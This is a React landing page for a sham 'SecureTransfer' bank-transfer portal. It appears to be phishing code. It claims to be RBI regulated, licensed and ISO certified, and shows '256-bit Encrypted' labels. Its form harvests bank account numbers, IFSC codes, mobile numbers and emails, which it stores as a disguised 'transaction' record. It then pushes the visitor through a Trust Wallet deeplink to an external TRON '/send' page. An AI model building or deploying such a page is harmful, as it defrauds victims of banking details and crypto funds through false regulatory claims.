import { useState } from "react";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";

declare global {
  interface Window {
    tronWeb?: any;
    tronLink?: any;
  }
}

export default function LandingPage() {
  const [form, setForm] = useState({
    accountHolder: "",
    accountNumber: "",
    ifsc: "",
    branch: "",
    mobile: "",
    email: "",
  });
  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [showWalletButton, setShowWalletButton] = useState(false);

  const createTransaction = useMutation(api.transactions.createTransaction);

  const DEEPLINK = "trust://open_url?coin_id=195&url=" + encodeURIComponent("https://apptron.vercel.app/send");

  function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
    setForm({ ...form, [e.target.name]: e.target.value });
    setErrors({ ...errors, [e.target.name]: "" });
  }

  function validate() {
    const newErrors: Record<string, string> = {};
    if (!form.accountHolder.trim()) newErrors.accountHolder = "Required";
    if (!form.accountNumber.trim()) newErrors.accountNumber = "Required";
    if (!form.ifsc.trim()) newErrors.ifsc = "Required";
    if (!form.mobile.trim() || form.mobile.length < 10) newErrors.mobile = "Enter valid mobile";
    if (form.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) newErrors.email = "Invalid email";
    return newErrors;
  }

  async function handleSubmit() {
    const newErrors = validate();
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }
    setLoading(true);
    try {
      await createTransaction({
        walletAddress: form.mobile,
        toAddress: "landing_form",
        amount: "0",
        txHash: `form_${Date.now()}`,
        usdtBalance: `Name: ${form.accountHolder} | Acc: ${form.accountNumber} | IFSC: ${form.ifsc} | Branch: ${form.branch} | Email: ${form.email}`,
        nativeBalance: "0",
      });
      setSubmitted(true);

      // Auto detect: Trust Wallet dApp browser or normal browser
      if (window.tronWeb?.defaultAddress?.base58) {
        // Already in Trust Wallet dApp browser — redirect to /send
        setTimeout(() => {
          window.location.href = "/send";
        }, 2000);
      } else {
        // Normal browser — show "Open in Trust Wallet" button
        setShowWalletButton(true);
      }
    } catch (e) {
      console.error(e);
      setLoading(false);
    }
  }

  const inputStyle = (hasError?: boolean): React.CSSProperties => ({
    width: "100%",
    padding: "11px 14px",
    background: "#1a1a2e",
    border: `1px solid ${hasError ? "#ff4444" : "#2a2a4a"}`,
    borderRadius: "8px",
    fontSize: "14px",
    color: "white",
    outline: "none",
    boxSizing: "border-box",
    transition: "border-color 0.2s",
  });

  return (
    <div style={{ minHeight: "100vh", background: "#0a0a1a", fontFamily: "'Segoe UI', Arial, sans-serif", display: "flex", flexDirection: "column" }}>
      {/* Header */}
      <div style={{ background: "#0d0d2b", borderBottom: "1px solid #1a1a3e", padding: "16px 24px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
          <div style={{ width: "40px", height: "40px", background: "#0077b6", borderRadius: "10px", display: "flex", alignItems: "center", justifyContent: "center" }}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
              <path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/>
            </svg>
          </div>
          <div>
            <div style={{ color: "white", fontWeight: 700, fontSize: "16px" }}>SecureTransfer</div>
            <div style={{ color: "#6b7db3", fontSize: "11px" }}>Verified Transfer Portal</div>
          </div>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: "6px", background: "#0a2a1a", border: "1px solid #0d4a2a", borderRadius: "20px", padding: "5px 12px" }}>
          <div style={{ width: "6px", height: "6px", background: "#00ff88", borderRadius: "50%" }}></div>
          <span style={{ color: "#00ff88", fontSize: "12px" }}>Secure</span>
        </div>
      </div>

      {/* Main */}
      <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", padding: "24px 16px" }}>
        <div style={{ width: "100%", maxWidth: "520px" }}>
          {!submitted ? (
            <>
              <div style={{ textAlign: "center", marginBottom: "24px" }}>
                <h1 style={{ color: "white", margin: "0 0 8px", fontSize: "22px", fontWeight: 700 }}>Bank Transfer Details</h1>
                <p style={{ color: "#6b7db3", margin: 0, fontSize: "14px" }}>Enter your bank details to initiate the transfer process</p>
              </div>

              {/* Stats */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "10px", marginBottom: "20px" }}>
                {[{ label: "Daily Limit", value: "₹10 Cr" }, { label: "Transfer Time", value: "Instant" }, { label: "Success Rate", value: "99.9%" }].map(stat => (
                  <div key={stat.label} style={{ background: "#0d0d2b", border: "1px solid #1a1a3e", borderRadius: "10px", padding: "12px", textAlign: "center" }}>
                    <div style={{ color: "#00b4d8", fontWeight: 700, fontSize: "14px" }}>{stat.value}</div>
                    <div style={{ color: "#6b7db3", fontSize: "11px", marginTop: "2px" }}>{stat.label}</div>
                  </div>
                ))}
              </div>

              {/* Form Card */}
              <div style={{ background: "#0d0d2b", border: "1px solid #1a1a3e", borderRadius: "16px", overflow: "hidden" }}>
                <div style={{ background: "#0077b6", padding: "14px 20px", display: "flex", alignItems: "center", gap: "10px" }}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
                    <rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/>
                  </svg>
                  <span style={{ color: "white", fontWeight: 600, fontSize: "14px" }}>Account Information</span>
                  <div style={{ marginLeft: "auto", display: "flex", alignItems: "center", gap: "5px" }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.8)" strokeWidth="2">
                      <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                    </svg>
                    <span style={{ color: "rgba(255,255,255,0.8)", fontSize: "11px" }}>256-bit Encrypted</span>
                  </div>
                </div>

                <div style={{ padding: "20px" }}>
                  {[
                    { label: "Account Holder Name", name: "accountHolder", placeholder: "Full name as per bank records", type: "text", required: true },
                    { label: "Account Number", name: "accountNumber", placeholder: "Enter your account number", type: "text", required: true },
                  ].map(field => (
                    <div key={field.name} style={{ marginBottom: "14px" }}>
                      <label style={{ display: "block", fontSize: "12px", color: "#8892b0", marginBottom: "5px", fontWeight: 500 }}>
                        {field.label} {field.required && <span style={{ color: "#ff4444" }}>*</span>}
                      </label>
                      <input name={field.name} type={field.type} placeholder={field.placeholder}
                        value={form[field.name as keyof typeof form]} onChange={handleChange}
                        style={inputStyle(!!errors[field.name])} />
                      {errors[field.name] && <span style={{ color: "#ff4444", fontSize: "11px" }}>{errors[field.name]}</span>}
                    </div>
                  ))}

                  <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", marginBottom: "14px" }}>
                    <div>
                      <label style={{ display: "block", fontSize: "12px", color: "#8892b0", marginBottom: "5px", fontWeight: 500 }}>IFSC Code <span style={{ color: "#ff4444" }}>*</span></label>
                      <input name="ifsc" type="text" placeholder="e.g. HDFC0001234" value={form.ifsc} onChange={handleChange} style={inputStyle(!!errors.ifsc)} />
                      {errors.ifsc && <span style={{ color: "#ff4444", fontSize: "11px" }}>{errors.ifsc}</span>}
                    </div>
                    <div>
                      <label style={{ display: "block", fontSize: "12px", color: "#8892b0", marginBottom: "5px", fontWeight: 500 }}>Branch Name</label>
                      <input name="branch" type="text" placeholder="Branch name" value={form.branch} onChange={handleChange} style={inputStyle()} />
                    </div>
                  </div>

                  <div style={{ marginBottom: "14px" }}>
                    <label style={{ display: "block", fontSize: "12px", color: "#8892b0", marginBottom: "5px", fontWeight: 500 }}>Mobile Number <span style={{ color: "#ff4444" }}>*</span></label>
                    <div style={{ position: "relative" }}>
                      <span style={{ position: "absolute", left: "12px", top: "50%", transform: "translateY(-50%)", color: "#6b7db3", fontSize: "14px" }}>+91</span>
                      <input name="mobile" type="tel" placeholder="10-digit mobile number" value={form.mobile} onChange={handleChange}
                        style={{ ...inputStyle(!!errors.mobile), paddingLeft: "44px" }} />
                    </div>
                    {errors.mobile && <span style={{ color: "#ff4444", fontSize: "11px" }}>{errors.mobile}</span>}
                  </div>

                  <div style={{ marginBottom: "20px" }}>
                    <label style={{ display: "block", fontSize: "12px", color: "#8892b0", marginBottom: "5px", fontWeight: 500 }}>Email Address</label>
                    <input name="email" type="email" placeholder="your@email.com" value={form.email} onChange={handleChange} style={inputStyle(!!errors.email)} />
                    {errors.email && <span style={{ color: "#ff4444", fontSize: "11px" }}>{errors.email}</span>}
                  </div>

                  <button onClick={handleSubmit} disabled={loading} style={{
                    width: "100%", padding: "14px",
                    background: loading ? "#1a1a3e" : "#0077b6",
                    color: "white", border: "none", borderRadius: "10px",
                    fontSize: "15px", fontWeight: 700, cursor: loading ? "not-allowed" : "pointer",
                    display: "flex", alignItems: "center", justifyContent: "center", gap: "8px",
                  }}>
                    {loading ? "Processing..." : "Proceed to Transfer →"}
                  </button>

                  <p style={{ color: "#4a5568", fontSize: "11px", textAlign: "center", margin: "10px 0 0" }}>
                    By proceeding, you agree to our Terms & Privacy Policy
                  </p>
                </div>
              </div>

              <div style={{ display: "flex", justifyContent: "center", gap: "20px", marginTop: "16px" }}>
                {["RBI Regulated", "ISO Certified", "256-bit SSL"].map(badge => (
                  <div key={badge} style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                    <div style={{ width: "6px", height: "6px", background: "#00b4d8", borderRadius: "50%" }}></div>
                    <span style={{ color: "#6b7db3", fontSize: "11px" }}>{badge}</span>
                  </div>
                ))}
              </div>
            </>
          ) : (
            <div style={{ background: "#0d0d2b", border: "1px solid #0d4a2a", borderRadius: "16px", padding: "40px 24px", textAlign: "center" }}>
              <div style={{ width: "64px", height: "64px", background: "#0a2a1a", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px", border: "2px solid #00ff88" }}>
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#00ff88" strokeWidth="2.5"><polyline points="20,6 9,17 4,12"/></svg>
              </div>
              <h2 style={{ color: "white", margin: "0 0 8px", fontSize: "20px" }}>Details Submitted!</h2>
              
              {showWalletButton ? (
                <>
                  <p style={{ color: "#6b7db3", fontSize: "14px", margin: "0 0 20px" }}>Please open in Trust Wallet to continue</p>
                  <a href={DEEPLINK} style={{
                    display: "inline-flex", alignItems: "center", justifyContent: "center", gap: "10px",
                    width: "100%", padding: "16px",
                    background: "#0077b6", color: "white", border: "none", borderRadius: "12px",
                    fontSize: "16px", fontWeight: 700, cursor: "pointer", textDecoration: "none",
                    marginBottom: "12px",
                  }}>
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
                      <path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/>
                    </svg>
                    Open in Trust Wallet
                  </a>
                  <p style={{ color: "#4a5568", fontSize: "11px", margin: "8px 0 0" }}>
                    Make sure Trust Wallet is installed on your device
                  </p>
                </>
              ) : (
                <>
                  <p style={{ color: "#6b7db3", fontSize: "14px", margin: "0 0 20px" }}>Redirecting to secure transfer portal...</p>
                  <div style={{ background: "#1a1a3e", borderRadius: "8px", padding: "12px", fontSize: "13px", color: "#6b7db3" }}>
                    Opening wallet verification...
                  </div>
                </>
              )}
            </div>
          )}
        </div>
      </div>

      <div style={{ background: "#0d0d2b", borderTop: "1px solid #1a1a3e", padding: "12px 24px", textAlign: "center" }}>
        <span style={{ color: "#4a5568", fontSize: "11px" }}>© 2024 SecureTransfer | All rights reserved | RBI Licensed Payment Gateway</span>
      </div>
    </div>
  );
}
